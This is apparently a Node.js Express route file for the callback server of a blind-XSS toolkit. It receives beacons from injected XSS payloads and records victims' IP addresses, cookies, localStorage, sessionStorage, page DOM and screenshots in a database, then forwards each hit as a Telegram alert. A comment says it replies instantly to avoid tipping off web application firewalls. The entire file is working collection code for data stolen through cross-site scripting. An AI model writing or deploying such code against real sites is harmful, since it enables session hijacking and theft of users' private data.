const express = require('express');
const router = express.Router();
const db = require('../db');
const { sendAlert } = require('../lib/telegram');

// POST /callback - receives beacon from XSS payload
router.post('/', async (req, res) => {
  // Always respond immediately with 200 to not tip off WAFs / timing analysis
  res.status(200).json({ status: 'ok' });

  try {
    const ip =
      req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
      req.socket.remoteAddress ||
      'unknown';

    const {
      url,
      referer,
      cookies,
      localStorage: ls,
      sessionStorage: ss,
      dom,
      screenshot,
      ...extra
    } = req.body;

    const stmt = db.prepare(`
      INSERT INTO hits (ip, user_agent, origin_url, referer, cookies, local_storage, session_storage, dom, screenshot, extra)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
    `);

    const result = stmt.run(
      ip,
      req.headers['user-agent'] || null,
      url || null,
      referer || req.headers['referer'] || null,
      cookies ? JSON.stringify(cookies) : null,
      ls ? JSON.stringify(ls) : null,
      ss ? JSON.stringify(ss) : null,
      dom ? dom.substring(0, 50000) : null, // cap DOM size
      screenshot || null,
      Object.keys(extra).length ? JSON.stringify(extra) : null
    );

    const hit = db.prepare('SELECT * FROM hits WHERE id = ?').get(result.lastInsertRowid);

    console.log(`[HIT] #${hit.id} from ${ip} — ${url || 'unknown URL'}`);

    // Fire and forget Telegram alert
    sendAlert(hit).catch(console.error);

  } catch (err) {
    console.error('[Callback] Error processing hit:', err.message);
  }
});

// Also accept GET requests (for simple <img src="..."> style probes)
router.get('/', (req, res) => {
  res.status(200).send('');

  try {
    const ip =
      req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
      req.socket.remoteAddress ||
      'unknown';

    const stmt = db.prepare(`
      INSERT INTO hits (ip, user_agent, origin_url, referer)
      VALUES (?, ?, ?, ?)
    `);

    const result = stmt.run(
      ip,
      req.headers['user-agent'] || null,
      req.query.url || req.headers['referer'] || null,
      req.headers['referer'] || null
    );

    const hit = db.prepare('SELECT * FROM hits WHERE id = ?').get(result.lastInsertRowid);
    console.log(`[HIT-GET] #${hit.id} from ${ip}`);
    sendAlert(hit).catch(console.error);
  } catch (err) {
    console.error('[Callback GET] Error:', err.message);
  }
});

module.exports = router;
